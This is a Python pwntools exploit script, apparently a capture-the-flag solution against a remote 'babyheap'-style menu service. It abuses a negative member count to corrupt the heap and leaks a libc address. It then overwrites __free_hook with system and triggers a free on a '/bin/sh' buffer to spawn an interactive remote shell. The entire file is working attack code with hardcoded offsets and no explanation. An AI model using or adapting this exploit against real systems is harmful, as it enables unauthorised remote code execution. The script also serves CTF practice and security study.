from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

# p = remote("localhost", 4924)
# p = process("./babyheap")
# gdb.attach(p)

p = remote("13.124.157.141", 31337)

DEBUG = True

leak_offset = 0x3c4b0a
system_offset = 0x45390
freehook_offset = 0x3c67a8

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def create_team(desc_len, desc):
  r(">")
  s("1")

  r("length :")
  s(str(desc_len))

  r("Desc")
  s(desc)

def delete_team(idx):
  r(">")
  s("2")

  r("Index :")
  s(str(idx))

def enter_manage_team(idx):
  r(">")
  s("3")

  r("Index :")
  s(str(idx))

def leave_manage_team():
  r(">")
  s("5")

def add_member(name, desc):
  r("Name :")
  s(name, False)

  r("Description :")
  s(desc, False)

def add_members(num, dummy_mem = True):
  r(">")
  s("1")

  r("employment :")
  s(str(num))

  if num > 0 and dummy_mem:
    for i in xrange(num):
      txt = "/bin/sh\x00".ljust(100, "\x00")
      add_member(txt, txt)

def delete_member(idx):
  r(">")
  s("2")

  r("Index :")
  s(str(idx))


def list_member():
  r(">")
  s("3")

def manage_member(idx, desc):
  r(">")
  s("4")

  r("Index :")
  s(str(idx))

  r("Description :")
  s(desc, False)

def leak():
  r("Description :")
  leak_str = r("\x7f")[1:]

  return u64(leak_str.ljust(8, "\x00"))

create_team(0x10, "A" * 0x10)
create_team(0x10, "A" * 0x10)
create_team(0x10, "A" * 0x10)
delete_team(2)

enter_manage_team(0)
add_members(25)
add_members(-25)
leave_manage_team()

enter_manage_team(1)
add_members(1, False)
add_member("\n", "\n")

list_member()
libc_leak = leak()
libc_base = libc_leak - leak_offset

print "[*] libc_leak: 0x%x" % libc_leak
print "[*] libc_base: 0x%x" % libc_base

system_addr = libc_base + system_offset
freehook_addr = libc_base + freehook_offset

print "[*] system: 0x%x" % system_addr
print "[*] free_hook: 0x%x" % freehook_addr

payload = p64(freehook_addr)
# payload = payload.ljust(100, "\x00")

manage_member(0, payload)

leave_manage_team()

enter_manage_team(0)

payload = p64(system_addr)
# payload = payload.ljust(8, "\x00")

manage_member(0, payload)
delete_member(4)

p.interactive()
p.close()
